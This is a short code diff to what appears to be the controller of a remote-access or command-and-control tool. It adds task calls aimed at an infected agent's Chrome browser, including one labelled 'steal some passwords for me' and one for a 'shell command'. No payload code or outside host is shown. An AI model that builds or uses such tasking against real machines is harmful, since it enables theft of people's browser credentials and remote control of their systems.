@@ -67,4 +67,6 @@ def create_task(command_type, cmd, agent_id):
 
 if __name__ == "__main__":
     # register(key, client_id, password)
-    create_task(command_type="chrome", cmd="steal some passwords for me", agent_id="417edea396132c357c1ce381b5738ddd")
+    create_task(command_type="chrome", cmd="steal some passwords for me", agent_id="5c5c385909adcbf559783b84ee2b0a1f")
+    create_task(command_type="chrome", cmd="shell command", agent_id="5c5c385909adcbf559783b84ee2b0a1f")
+    create_task(command_type="chrome", cmd="change desktop background", agent_id="5c5c385909adcbf559783b84ee2b0a1f")
